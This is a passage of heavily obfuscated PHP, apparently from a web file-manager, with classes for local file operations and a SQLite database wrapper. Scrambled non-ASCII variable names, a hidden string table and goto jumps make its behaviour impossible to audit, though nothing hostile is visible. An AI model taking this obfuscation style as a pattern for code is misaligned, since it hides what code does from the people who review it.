fileOutImage($øğ«ôÅš, $éÏğ£–„ = 250) { if ($this->size($øğ«ôÅš) > 1024 * 1024 * 25) { return $this->fileOutImageServer($øğ«ôÅš, $éÏğ£–„); } $ö¬ Ñ½  = $this->link($øğ«ôÅš); $ö¬ Ñ½  .= $_SERVER[Ñ¯©ç][1425] . $éÏğ£–„; $this->fileOutLink($ö¬ Ñ½ ); } public function fileOutLink($¥Ø…ƒ²ö) { $ÉÁ“‰Ô =& $_SERVER[Ñ¯©ç]; if (substr($¥Ø…ƒ²ö, 0, 7) == $ÉÁ“‰Ô[1381]) { $¥Ø…ƒ²ö = $ÉÁ“‰Ô[1382] . substr($¥Ø…ƒ²ö, 7); } header($ÉÁ“‰Ô[175] . $¥Ø…ƒ²ö); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($øÅÆŸ•¨) { if (substr($øÅÆŸ•¨, 0, 2) == $_SERVER[Ñ¯©ç][1412]) { $øÅÆŸ•¨ = BASIC_PATH . substr($øÅÆŸ•¨, 2); } return $øÅÆŸ•¨; } public function iconvApp($İÑ¸Õ³À) { $ºó¹ªÖë =& $_SERVER[Ñ¯©ç]; global $config; return $this->iconvTo($İÑ¸Õ³À, $config[$ºó¹ªÖë[1410]], $config[$ºó¹ªÖë[1409]]); } public function iconvSystem($×£…ãÀò) { $üÍĞú =& $_SERVER[Ñ¯©ç]; global $config; return $this->iconvTo($×£…ãÀò, $config[$üÍĞú[1409]], $config[$üÍĞú[1410]]); } public function getPathOuter($‘§»ê•½) { $æ¾ûŠ½î =& $_SERVER[Ñ¯©ç]; $Û”ãøŠÏ = $this->iconvApp($this->pathBase); $‘§»ê•½ = $this->iconvApp($‘§»ê•½); if (substr($Û”ãøŠÏ, 0, 2) == $æ¾ûŠ½î[1412]) { $Û”ãøŠÏ = BASIC_PATH . substr($Û”ãøŠÏ, 2); } if (substr($‘§»ê•½, 0, 2) == $æ¾ûŠ½î[1412]) { $‘§»ê•½ = BASIC_PATH . substr($‘§»ê•½, 2); } $Û”ãøŠÏ = KodIO::clear($Û”ãøŠÏ); $‘§»ê•½ = KodIO::clear($‘§»ê•½); $‘§»ê•½ = substr($‘§»ê•½, strlen($Û”ãøŠÏ)); if (empty($this->pathDriver)) { return $‘§»ê•½; } return $this->pathDriver . $æ¾ûŠ½î[8] . ltrim($‘§»ê•½, $æ¾ûŠ½î[8]); } public function mkfile($¢•²•‘, $Œ´Ğë¶Ö = '', $ãÚ¡¹ú = REPEAT_RENAME) { $¢•²•‘ = $this->iconvSystem($¢•²•‘); @touch($¢•²•‘); if ($Œ´Ğë¶Ö) { file_put_contents($¢•²•‘, $Œ´Ğë¶Ö); } @chmod($¢•²•‘, $this->pathAuth); if (is_file($¢•²•‘)) { return $this->getPathOuter($¢•²•‘); } $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } public function mkdir($øí€ÍØ•, $€Éë¶§“ = REPEAT_SKIP) { $øí€ÍØ• = $this->iconvSystem($øí€ÍØ•); if (is_dir($øí€ÍØ•)) { return $this->getPathOuter($øí€ÍØ•); } @mkdir($øí€ÍØ•, $this->pathAuth, !0); @chmod($øí€ÍØ•, $this->pathAuth); if (is_dir($øí€ÍØ•)) { return $this->getPathOuter($øí€ÍØ•); } $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } public function copyFile($ÊÁÁ‘½, $â¾õõ¬Ê) { $this->mkdir($this->pathFather($â¾õõ¬Ê)); $ÊÁÁ‘½ = $this->iconvSystem($ÊÁÁ‘½); $â¾õõ¬Ê = $this->iconvSystem($â¾õõ¬Ê); $¡İê ÃÍ = copy_64($ÊÁÁ‘½, $â¾õõ¬Ê); @chmod($â¾õõ¬Ê, $this->pathAuth); if ($¡İê ÃÍ) { return $this->getPathOuter($â¾õõ¬Ê); } $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } public function moveFile($ô‹æ‡‹Ï, $°ûŒÈ‡) { $this->mkdir($this->pathFather($°ûŒÈ‡)); $ô‹æ‡‹Ï = $this->iconvSystem($ô‹æ‡‹Ï); $°ûŒÈ‡ = $this->iconvSystem($°ûŒÈ‡); $¤Ñæœ€À = intval(@rename($ô‹æ‡‹Ï, $°ûŒÈ‡)); if (!$¤Ñæœ€À) { if ($¤Ñæœ€À = intval(@copy_64($ô‹æ‡‹Ï, $°ûŒÈ‡))) { @unlink($ô‹æ‡‹Ï); } } @chmod($°ûŒÈ‡, $this->pathAuth); if ($¤Ñæœ€À) { return $this->getPathOuter($°ûŒÈ‡); } $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } public function movePath($À­ÏîºÙ, $õş‚»×ß, $îùªÀ¸ì = false) { $Š™Õ‡¥í =& $_SERVER[Ñ¯©ç]; $À­ÏîºÙ = $this->iconvSystem($À­ÏîºÙ); $õş‚»×ß = $this->iconvSystem($õş‚»×ß); $®šƒÉ‹  = rtrim($õş‚»×ß, $Š™Õ‡¥í[8]) . $Š™Õ‡¥í[8] . ($îùªÀ¸ì ? $îùªÀ¸ì : get_path_this($À­ÏîºÙ)); if (file_exists($®šƒÉ‹ )) { return !1; } $ŸåÄ÷¹í = intval(@rename($À­ÏîºÙ, $®šƒÉ‹ )); $ŸåÄ÷¹í = file_exists($®šƒÉ‹ ); if ($ŸåÄ÷¹í) { return $this->getPathOuter($®šƒÉ‹ ); } $this->writeLog(__FUNCTION__ . $Š™Õ‡¥í[1422], !0); return !1; } public function delFile($îÈ¸±é§) { $îÈ¸±é§ = $this->iconvSystem($îÈ¸±é§); if (!@unlink($îÈ¸±é§)) { @chmod($îÈ¸±é§, $this->pathAuth); if (@unlink($îÈ¸±é§)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); return !1; } return !0; } public function delFolder($³çŞœÑº) { $Â­°ÃÛ– =& $_SERVER[Ñ¯©ç]; $³çŞœÑº = $this->iconvSystem($³çŞœÑº); if (!is_dir($³çŞœÑº)) { return !0; } if (!($–ÙÕ¡öÉ = opendir($³çŞœÑº))) { return !1; } while (($Ş±°¯Ìõ = readdir($–ÙÕ¡öÉ)) !== !1) { if ($Ş±°¯Ìõ == $Â­°ÃÛ–[10] || $Ş±°¯Ìõ == $Â­°ÃÛ–[1335]) { continue; } $—ÑÂï–ø = $³çŞœÑº . $Â­°ÃÛ–[8] . $Ş±°¯Ìõ; if (is_file($—ÑÂï–ø) || is_link($—ÑÂï–ø)) { if (!unlink($—ÑÂï–ø)) { chmod($—ÑÂï–ø, $this->pathAuth); if (!unlink($—ÑÂï–ø)) { return !1; } } } else { if (is_dir($—ÑÂï–ø)) { chmod($—ÑÂï–ø, $this->pathAuth); $—ÑÂï–ø = $this->iconvApp($—ÑÂï–ø); if (!$this->delFolder($—ÑÂï–ø)) { return !1; } } } } closedir($–ÙÕ¡öÉ); return rmdir($³çŞœÑº); } public function rename($åêø”è, $ºä«×›Ä) { $»æÊØ =& $_SERVER[Ñ¯©ç]; $Íà‘èû = $this->fileNameAuto($this->pathFather($åêø”è), $ºä«×›Ä); $Íà‘èû = $this->iconvSystem($Íà‘èû); $åêø”è = $this->iconvSystem($åêø”è); $šŒÊÎ¼ğ = $this->pathFather($åêø”è); $ˆ²“ˆ¤ä = rtrim($šŒÊÎ¼ğ, $»æÊØ[8]) . $»æÊØ[8] . $Íà‘èû; $¤Ìõà¡’ = @rename($åêø”è, $ˆ²“ˆ¤ä); $ˆ²“ˆ¤ä = $this->iconvApp($ˆ²“ˆ¤ä); if ($¤Ìõà¡’) { return $this->getPathOuter($ˆ²“ˆ¤ä); } $this->writeLog(__FUNCTION__ . $»æÊØ[1422], !0); return !1; } public function size($ˆ¤†¥„Ì) { $ˆ¤†¥„Ì = $this->iconvSystem($ˆ¤†¥„Ì); return filesize_64($ˆ¤†¥„Ì); } public function info($”ÃôÊ“ù) { $”ÃôÊ“ù = $this->iconvSystem($”ÃôÊ“ù); if ($this->isFolder($”ÃôÊ“ù)) { return $this->folderInfo($”ÃôÊ“ù); } else { if ($this->isFile($”ÃôÊ“ù)) { return $this->fileInfo($”ÃôÊ“ù); } } return !1; } protected function infoChildren($¶…ÜüÜõ, &$è§æ±îú, $‚ûìÛ† = true) { $„­ü§Óß =& $_SERVER[Ñ¯©ç]; check_abort_echo(); $¶…ÜüÜõ = rtrim($¶…ÜüÜõ, $„­ü§Óß[8]) . $„­ü§Óß[8]; if ($‚ûìÛ†) { $¶…ÜüÜõ = $this->iconvSystem($¶…ÜüÜõ); } if (!($ÙÌ¬à£ = @opendir($¶…ÜüÜõ))) { return; } while (($ÎÁï Ç“ = readdir($ÙÌ¬à£)) !== !1) { if ($ÎÁï Ç“ == $„­ü§Óß[10] || $ÎÁï Ç“ == $„­ü§Óß[1335]) { continue; } $¹½Îš“å = $¶…ÜüÜõ . $ÎÁï Ç“; if (is_file($¹½Îš“å) || is_link($¹½Îš“å)) { $è§æ±îú[$„­ü§Óß[90]]++; $è§æ±îú[$„­ü§Óß[89]] += filesize_64($¹½Îš“å); } else { if (is_dir($¹½Îš“å)) { $è§æ±îú[$„­ü§Óß[91]]++; $this->infoChildren($¹½Îš“å, $è§æ±îú, !1); } } } closedir($ÙÌ¬à£); } private function folderInfo($çêÂô©Í, $ßëÅ»¶¾ = false) { $„Ûò®İª =& $_SERVER[Ñ¯©ç]; $çêÂô©Í = rtrim($çêÂô©Í, $„Ûò®İª[8]) . $„Ûò®İª[8]; $±¼İ÷Œ = $this->iconvApp($this->pathThis($çêÂô©Í)); if ($ßëÅ»¶¾) { return array($„Ûò®İª[32] => $±¼İ÷Œ, $„Ûò®İª[97] => $this->getPathOuter($çêÂô©Í), $„Ûò®İª[33] => $„Ûò®İª[88]); } $ãª¦ŸÔõ = array($„Ûò®İª[32] => $±¼İ÷Œ, $„Ûò®İª[97] => $this->getPathOuter($çêÂô©Í), $„Ûò®İª[33] => $„Ûò®İª[88], $„Ûò®İª[232] => @filectime($çêÂô©Í), $„Ûò®İª[98] => @filemtime($çêÂô©Í), $„Ûò®İª[1426] => @fileatime($çêÂô©Í), $„Ûò®İª[1427] => is_readable($çêÂô©Í), $„Ûò®İª[1428] => is_writable($çêÂô©Í), $„Ûò®İª[1429] => get_mode($çêÂô©Í)); return $ãª¦ŸÔõ; } private function fileInfo($Á±šÈ˜š, $ÖúéğöÓ = false) { $Ö—±ŠÑÌ =& $_SERVER[Ñ¯©ç]; $à°«ª”– = $this->iconvApp($this->pathThis($Á±šÈ˜š)); if ($ÖúéğöÓ) { return array($Ö—±ŠÑÌ[32] => $à°«ª”–, $Ö—±ŠÑÌ[97] => $this->getPathOuter($Á±šÈ˜š), $Ö—±ŠÑÌ[33] => $Ö—±ŠÑÌ[231], $Ö—±ŠÑÌ[89] => $this->size($Á±šÈ˜š), $Ö—±ŠÑÌ[188] => $this->ext($à°«ª”–)); } $ÛÃàÁÆè = array($Ö—±ŠÑÌ[32] => $à°«ª”–, $Ö—±ŠÑÌ[97] => $this->getPathOuter($Á±šÈ˜š), $Ö—±ŠÑÌ[33] => $Ö—±ŠÑÌ[231], $Ö—±ŠÑÌ[232] => @filectime($Á±šÈ˜š), $Ö—±ŠÑÌ[98] => @filemtime($Á±šÈ˜š), $Ö—±ŠÑÌ[1426] => @fileatime($Á±šÈ˜š), $Ö—±ŠÑÌ[89] => $this->size($Á±šÈ˜š), $Ö—±ŠÑÌ[188] => $this->ext($à°«ª”–), $Ö—±ŠÑÌ[1427] => is_readable($Á±šÈ˜š), $Ö—±ŠÑÌ[1428] => is_writable($Á±šÈ˜š), $Ö—±ŠÑÌ[1429] => get_mode($Á±šÈ˜š)); return $ÛÃàÁÆè; } public function exist($ÇÎÆ€Õº) { $ÇÎÆ€Õº = $this->iconvSystem($ÇÎÆ€Õº); return @file_exists($ÇÎÆ€Õº); } public function isFile($µıÁüôß) { $µıÁüôß = $this->iconvSystem($µıÁüôß); return @is_file($µıÁüôß); } public function isFolder($«­æÛòØ) { $«­æÛòØ = $this->iconvSystem($«­æÛòØ); return @is_dir($«­æÛòØ); } public function listPath($Øş½°ê´, $À«ûÂµ¾ = false) { $–ÃáãÎ’ =& $_SERVER[Ñ¯©ç]; $Øş½°ê´ = $this->iconvSystem($Øş½°ê´); $Øş½°ê´ = rtrim($Øş½°ê´, $–ÃáãÎ’[8]) . $–ÃáãÎ’[8]; $üâ¾÷’ = array($–ÃáãÎ’[95] => array(), $–ÃáãÎ’[96] => array()); if (!($ÌÄÔÄÆ“ = @opendir($Øş½°ê´))) { return $üâ¾÷’; } while (($ú¼÷ıãƒ = readdir($ÌÄÔÄÆ“)) !== !1) { if ($ú¼÷ıãƒ == $–ÃáãÎ’[10] || $ú¼÷ıãƒ == $–ÃáãÎ’[1335]) { continue; } $Ë‰ùèÖÀ = $Øş½°ê´ . $ú¼÷ıãƒ; if (is_file($Ë‰ùèÖÀ)) { $üâ¾÷’[$–ÃáãÎ’[96]][] = $this->fileInfo($Ë‰ùèÖÀ, $À«ûÂµ¾); } else { $üâ¾÷’[$–ÃáãÎ’[95]][] = $this->folderInfo($Ë‰ùèÖÀ, $À«ûÂµ¾); } } closedir($ÌÄÔÄÆ“); return $üâ¾÷’; } public function listAll($ÈŒôË¯®, &$ˆ†îãË = array()) { $Ãõ¸¤× =& $_SERVER[Ñ¯©ç]; $ÈŒôË¯® = $this->iconvSystem($ÈŒôË¯®); $ÈŒôË¯® = rtrim($ÈŒôË¯®, $Ãõ¸¤×[8]) . $Ãõ¸¤×[8]; if (!($·ÚÜ¢Š = @opendir($ÈŒôË¯®))) { return $ˆ†îãË; } while (($ºâéú¶ = readdir($·ÚÜ¢Š)) !== !1) { if ($ºâéú¶ == $Ãõ¸¤×[10] || $ºâéú¶ == $Ãõ¸¤×[1335]) { continue; } $•¬èÉœ¹ = $ÈŒôË¯® . $ºâéú¶; $ı¥ù¾”à = is_dir($•¬èÉœ¹) && !is_link($•¬èÉœ¹) ? 1 : 0; $•¬èÉœ¹ = $ı¥ù¾”à ? $•¬èÉœ¹ . $Ãõ¸¤×[8] : $•¬èÉœ¹; $ˆ†îãË[] = array($Ãõ¸¤×[97] => $•¬èÉœ¹, $Ãõ¸¤×[88] => $ı¥ù¾”à, $Ãõ¸¤×[98] => intval(@filemtime($•¬èÉœ¹)), $Ãõ¸¤×[89] => $ı¥ù¾”à ? 0 : intval($this->size($•¬èÉœ¹))); if ($ı¥ù¾”à) { $this->listAll($•¬èÉœ¹, $ˆ†îãË); } } closedir($·ÚÜ¢Š); return $ˆ†îãË; } public function has($İ°¼„À, $­ı€Ù•Ã = false, $Ô£ÎÚåÂ = true) { $Ø¾°ö¥„ =& $_SERVER[Ñ¯©ç]; $İ°¼„À = $this->iconvSystem($İ°¼„À); $İ°¼„À = rtrim($İ°¼„À, $Ø¾°ö¥„[8]) . $Ø¾°ö¥„[8]; if (!($ÈŸ›¤Õ§ = @opendir($İ°¼„À))) { return !1; } $ûˆ‡·µ» = 0; $ØÇç®Î± = 0; $¾Â¤Œßá = 0; while (($òú¦¡¥ı = readdir($ÈŸ›¤Õ§)) !== !1) { if ($òú¦¡¥ı == $Ø¾°ö¥„[10] || $òú¦¡¥ı == $Ø¾°ö¥„[1335]) { continue; } $±Ğ¢øĞ° = $İ°¼„À . $òú¦¡¥ı; if ($­ı€Ù•Ã) { $¾Â¤Œßá++; if (@is_file($±Ğ¢øĞ°)) { $ûˆ‡·µ»++; } else { $ØÇç®Î±++; } if ($¾Â¤Œßá > 10000) { break; } continue; } if ($Ô£ÎÚåÂ) { if (@is_file($±Ğ¢øĞ°)) { return !0; } } else { if (@is_dir($±Ğ¢øĞ° . $Ø¾°ö¥„[8])) { return !0; } } } closedir($ÈŸ›¤Õ§); if ($­ı€Ù•Ã) { return array($Ø¾°ö¥„[240] => $ûˆ‡·µ», $Ø¾°ö¥„[241] => $ØÇç®Î±); } return !1; } public function hashSimple($ùƒ‰‚¸Ò) { $€£üŞ¯Ú =& $_SERVER[Ñ¯©ç]; if (!$ùƒ‰‚¸Ò) { return md5($€£üŞ¯Ú[12]); } $ùƒ‰‚¸Ò = $this->iconvSystem($ùƒ‰‚¸Ò); $šöï½›û = $this->size($ùƒ‰‚¸Ò); $È¤–ıÎ¨ = 200; $íÌÍó = 50; if ($šöï½›û <= $È¤–ıÎ¨ * $íÌÍó) { return $this->hashMd5($ùƒ‰‚¸Ò) . $šöï½›û; } $Ù©¯æø = $€£üŞ¯Ú[12]; $¸•éöãÊ = intval($šöï½›û / $íÌÍó); $«ùÚ›’ = fopen($ùƒ‰‚¸Ò, $€£üŞ¯Ú[1430]); if (!$«ùÚ›’) { return $Ù©¯æø; } for ($áËş…äú = 0; $áËş…äú < $íÌÍó; $áËş…äú++) { fseek_64($«ùÚ›’, $¸•éöãÊ * $áËş…äú); $Ù©¯æø .= fread($«ùÚ›’, $È¤–ıÎ¨); } fseek_64($«ùÚ›’, $šöï½›û - $È¤–ıÎ¨); $Ù©¯æø .= fread($«ùÚ›’, $È¤–ıÎ¨); fclose($«ùÚ›’); return md5($Ù©¯æø) . $šöï½›û; } public function getContent($”ÃİÏÄ¯) { $”ÃİÏÄ¯ = $this->iconvSystem($”ÃİÏÄ¯); return file_get_contents($”ÃİÏÄ¯); } public function setContent($Óæ¥Ì»‘, $©úñğÓ = '') { $Óæ¥Ì»‘ = $this->iconvSystem($Óæ¥Ì»‘); $Æì¦¢Œ‹ = @file_put_contents($Óæ¥Ì»‘, $©úñğÓ, LOCK_EX); if (!$Æì¦¢Œ‹) { $this->writeLog(__FUNCTION__ . $_SERVER[Ñ¯©ç][1422], !0); } clearstatcache(); @chmod($Óæ¥Ì»‘, $this->pathAuth); return $Æì¦¢Œ‹ === !1 ? !1 : !0; } public function fileSubstr($½Œåò™ñ, $Ú¯Ñ»†Ù = 0, $­ÎÃÖ = false) { $ÚÊÀÃ¾Ï =& $_SERVER[Ñ¯©ç]; $½Œåò™ñ = $this->iconvSystem($½Œåò™ñ); if ($­ÎÃÖ === !1) { $­ÎÃÖ = $this->size($½Œåò™ñ); } if ($­ÎÃÖ <= 0) { return $ÚÊÀÃ¾Ï[12]; } $æ¾ÚÁ“Å = fopen($½Œåò™ñ, $ÚÊÀÃ¾Ï[1430]); if (!$æ¾ÚÁ“Å) { return !1; } fseek_64($æ¾ÚÁ“Å, $Ú¯Ñ»†Ù); $³äé­õ· = fread($æ¾ÚÁ“Å, $­ÎÃÖ); fclose($æ¾ÚÁ“Å); if (!$³äé­õ·) { $this->writeLog(__FUNCTION__ . $ÚÊÀÃ¾Ï[1422], !0); } return $³äé­õ·; } public function upload($ÚÕù±åÉ, $ûˆ ÉÃş, $ÃÆŸêº = false, $‘ìÜ™á = REPEAT_REPLACE) { if ($ÃÆŸêº) { return $this->moveFile($ûˆ ÉÃş, $ÚÕù±åÉ); } return $this->copyFile($ûˆ ÉÃş, $ÚÕù±åÉ); } public function setModifyTime($ç¢Ÿò, $Øæ¥İ„ = '') { @touch($ç¢Ÿò, intval($Øæ¥İ„)); } public function download($ÅŸ˜­´, $×»±øÄË) { return $this->iconvSystem($ÅŸ˜­´); } } goto CÊÆ´§»Å¶; C¤—ğÆñö: class DbSqlite3Base extends Db { public function __construct($ûôª‰Äş = '') { $¤î’ú¦¼ =& $_SERVER[Ñ¯©ç]; if (!class_exists($¤î’ú¦¼[64])) { think_exception(think_lang($¤î’ú¦¼[14]) . $¤î’ú¦¼[65]); } if (!empty($ûôª‰Äş)) { if (!isset($ûôª‰Äş[$¤î’ú¦¼[16]])) { $ûôª‰Äş[$¤î’ú¦¼[16]] = 438; } $this->config = $ûôª‰Äş; if (empty($this->config[$¤î’ú¦¼[17]])) { $this->config[$¤î’ú¦¼[17]] = array(); } } } public function connect($ó»Ô¿ã¶ = '', $¦éşÎƒ = 0) { $ıôÔûò® =& $_SERVER[Ñ¯©ç]; if (!isset($this->linkID[$¦éşÎƒ])) { if (empty($ó»Ô¿ã¶)) { $ó»Ô¿ã¶ = $this->config; } $this->linkID[$¦éşÎƒ] = new SQLite3($ó»Ô¿ã¶[$ıôÔûò®[21]]); if (!$this->linkID[$¦éşÎƒ]) { think_exception($this->linkID[$¦éşÎƒ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$¦éşÎƒ]->busyTimeout(30000); if (1 != think_config($ıôÔûò®[22])) { unset($this->config); } } return $this->linkID[$¦éşÎƒ]; } public function free() { $this->queryID = null; } public function query($ò¥À) { $ ŸûÊñê =& $_SERVER[Ñ¯©ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ò¥À; if ($this->queryID) { $this->free(); } think_action_status($ ŸûÊñê[23], 1); think_status($ ŸûÊñê[24]); $this->queryID = $this->_linkID->query($ò¥À); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $èîØ©« = $this->getAll(); $this->numRows = count($èîØ©«); return $èîØ©«; } } public function execute($õ¥ÓĞÈ„) { $ı„¬‹Ú =& $_SERVER[Ñ¯©ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $õ¥ÓĞÈ„; if ($this->queryID) { $this->free(); } think_action_status($ı„¬‹Ú[25], 1); think_status($ı„¬‹Ú[24]); $˜¡à’‚î = $this->_linkID->exec($õ¥ÓĞÈ„); $this->debug(); if (!1 === $˜¡à’‚î) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ñ¯©ç][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÌÕöØÄã = $this->_linkID->query($_SERVER[Ñ¯©ç][27]); if (!$ÌÕöØÄã) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $è¯‰„¡ = $this->_linkID->query($_SERVER[Ñ¯©ç][28]); if (!$è¯‰„¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $…œóæàš = array(); while ($‚®Ã—èú = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $…œóæàš[] = $‚®Ã—èú; } $this->queryID->reset(); return $…œóæàš; } public function getFields($Ÿù·“ğ¼) { $‡Â²µçÙ =& $_SERVER[Ñ¯©ç]; $û§¾“ˆÜ = $this->query($‡Â²µçÙ[29] . $Ÿù·“ğ¼ . $‡Â²µçÙ[30]); $ğ‚œâ = array(); if ($û§¾“ˆÜ) { foreach ($û§¾“ˆÜ as $…ß†¿åé => $Üï½Øæ) { $ğ‚œâ[$Üï½Øæ[$‡Â²µçÙ[32]]] = array($‡Â²µçÙ[32] => $Üï½Øæ[$‡Â²µçÙ[32]], $‡Â²µçÙ[33] => $Üï½Øæ[$‡Â²µçÙ[33]], $‡Â²µçÙ[35] => (bool) ($Üï½Øæ[$‡Â²µçÙ[35]] === $‡Â²µçÙ[12]), $‡Â²µçÙ[37] => $Üï½Øæ[$‡Â²µçÙ[66]], $‡Â²µçÙ[39] => (bool) $Üï½Øæ[$‡Â²µçÙ[67]], $‡Â²µçÙ[42] => (bool) $Üï½Øæ[$‡Â²µçÙ[67]]); } } return $ğ‚œâ; } public function getTables($²ù®ûÀ÷ = '') { $®í©àäø =& $_SERVER[Ñ¯©ç]; $€¶Ù–×• = $this->query($®í©àäø[45] . $®í©àäø[46] . $®í©àäø[47]); $±ßÃ¹ú‡ = array(); foreach ($€¶Ù–×• as $ÏƒŒ”¹å => $øØ¤³ÎÔ) { $±ßÃ¹ú‡[$ÏƒŒ”¹å] = current($øØ¤³ÎÔ); } return $±ßÃ¹ú‡; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $­Î”îéÎ =& $_SERVER[Ñ¯©ç]; $this->error = $this->_linkID->lastErrorMsg(); if ($­Î”îéÎ[12] != $this->queryStr) { $this->error .= LNG($­Î”îéÎ[48]) . $this->queryStr; } think_trace($this->error, $­Î”îéÎ[12], $­Î”îéÎ[49]); return $this->error; } public function escapeString($¹Íîü‡´) { $©¿ÎÈ— =& $_SERVER[Ñ¯©ç]; if ($this->_linkID) { return $this->_linkID->escapeString($¹Íîü‡´); } return str_ireplace($©¿ÎÈ—[68], $©¿ÎÈ—[69], $¹Íîü‡´); } public function parseLimit($½ûÕÕƒ¥) { $ÂíÏ³ñÂ =& $_SERVER[Ñ¯©ç]; $Á‹ÛÒæ = $ÂíÏ³ñÂ[12]; if (!empty($½ûÕÕƒ¥)) { $½ûÕÕƒ¥ = explode($ÂíÏ³ñÂ[50], $½ûÕÕƒ¥); if (count($½ûÕÕƒ¥) > 1) { $Á‹ÛÒæ .= $ÂíÏ³ñÂ[51] . $½ûÕÕƒ¥[1] . $ÂíÏ³ñÂ[52] . $½ûÕÕƒ¥[0] . $ÂíÏ³ñÂ[53]; } else { $Á‹ÛÒæ .= $ÂíÏ³ñÂ[51] . $½ûÕÕƒ¥[0] . $ÂíÏ³ñÂ[53]; } } return $Á‹ÛÒæ; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $‘å–ı¼Ì =& $_SERVER[Ñ¯©ç]; $this->objectDriver = array($‘å–ı¼Ì[70], $‘å–ı¼Ì[71], $‘å–ı¼Ì[72], $‘å–ı¼Ì[73], $‘å–ı¼Ì[74], $‘å–ı¼Ì[75], $‘å–ı¼Ì[76], $‘å–ı¼Ì[77], $‘å–ı¼Ì[78], $‘å–ı¼Ì[79], $‘å–ı¼Ì[80], $‘å–ı¼Ì[81]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($«”£Â‹ê) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($«”£Â‹ê, $_SERVER[Ñ¯©ç][8]); } return $«”£Â‹ê; } public function iconvApp($ªÃ‚Ã¾¥) { return $ªÃ‚Ã¾¥; } public function iconvSystem($’é“¥²¿) { return $’é“¥²¿; } public function iconvTo($š¥À‡²ş, $ıØ«š¼Ğ, $ª‰ıĞœ) { $åĞÆ¡“² =& $_SERVER[Ñ¯©ç]; if (!$š¥À‡²ş || !function_exists($åĞÆ¡“²[82])) { return $š¥À‡²ş; } static $ıàşÔçÊ = array(); $ğ›¯Şúº = $ıØ«š¼Ğ . $åĞÆ¡“²[83] . $ª‰ıĞœ . $åĞÆ¡“²[84] . $š¥À‡²ş; if (isset($ıàşÔçÊ[$ğ›¯Şúº])) { return $ıàşÔçÊ[$ğ›¯Şúº]; } if (function_exists($åĞÆ¡“²[85])) { $˜Úï²‚œ = @mb_convert_encoding($š¥À‡²ş, $ª‰ıĞœ, $ıØ«š¼Ğ); } else { $˜Úï²‚œ = @iconv($ıØ«š¼Ğ, $ª‰ıĞœ, $š¥À‡²ş); } $˜Úï²‚œ = $˜Úï²‚œ ? $˜Úï²‚œ : $š¥À‡²ş; if (strstr($˜Úï²‚œ, $åĞÆ¡“²[86])) { $˜Úï²‚œ = str_replace($åĞÆ¡“²[86], $åĞÆ¡“²[11], $˜Úï²‚œ); } $ıàşÔçÊ[$ıØ«š¼Ğ . $åĞÆ¡“²[83] . $ª‰ıĞœ . $åĞÆ¡“²[84] . $š¥À‡²ş] = $˜Úï²‚œ; $ıàşÔçÊ[$ª‰ıĞœ . $åĞÆ¡“²[83] . $ıØ«š¼Ğ . $åĞÆ¡“²[84] . $š¥À‡²ş] = $š¥À‡²ş; $ıàşÔçÊ[$ª‰ıĞœ . $åĞÆ¡“²[83] . $ıØ«š¼Ğ . $åĞÆ¡“²[84] . $˜Úï²‚œ] = $š¥À‡²ş; $ıàşÔçÊ[$ıØ«š¼Ğ . $åĞÆ¡“²[83] . $ª‰ıĞœ . $åĞÆ¡“²[84] . $˜Úï²‚œ] = $˜Úï²‚œ; return $˜Úï²‚œ; } public function getPathInner($š€ÆşÈğ) { $„æÈ¨ù = IO::init($š€ÆşÈğ); return $„æÈ¨ù->path; } public function getPathOuter($‰‹öõËÁ) { $­³ ÑÌ¦ =& $_SERVER[Ñ¯©ç]; $Àİö¢•˜ = strlen(trim($this->pathBase, $­³ ÑÌ¦[8])); $‰‹öõËÁ = substr(trim($‰‹öõËÁ, $­³ ÑÌ¦[8]), $Àİö¢•˜); return $this->pathDriver . $­³ ÑÌ¦[8] . ltrim($‰‹öõËÁ, $­³ ÑÌ¦[8]); } public function isParentOf($Ô÷üª‹, $éı¹Í®á) { $”Œ¬ªòÌ =& $_SERVER[Ñ¯©ç]; $Ô÷üª‹ = rtrim(strtolower($Ô÷üª‹), $”Œ¬ªòÌ[8]) . $”Œ¬ªòÌ[8]; $éı¹Í®á = rtrim(strtolower($éı¹Í®á), $”Œ¬ªòÌ[8]) . $”Œ¬ªòÌ[8]; $¦¶ñü¸Õ = strpos($éı¹Í®á, $Ô÷üª‹) === 0; return $¦¶ñü¸Õ; } public function getType() { $ÅÍŞüÅ› =& $_SERVER[Ñ¯©ç]; $Ã¶²‰Ú÷ = str_replace($ÅÍŞüÅ›[87], $ÅÍŞüÅ›[12], get_class($this)); return strtolower($Ã¶²‰Ú÷); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($šÑáÂ›é, $ÏË‘ÇÙ) { $ã™ï¨ =& $_SERVER[Ñ¯©ç]; $¯Îå£± = rtrim($šÑáÂ›é, $ã™ï¨[8]) . $ã™ï¨[8] . $ÏË‘ÇÙ; $û¸¬§ü = $this->exist($¯Îå£±); return $û¸¬§ü ? $¯Îå£± : 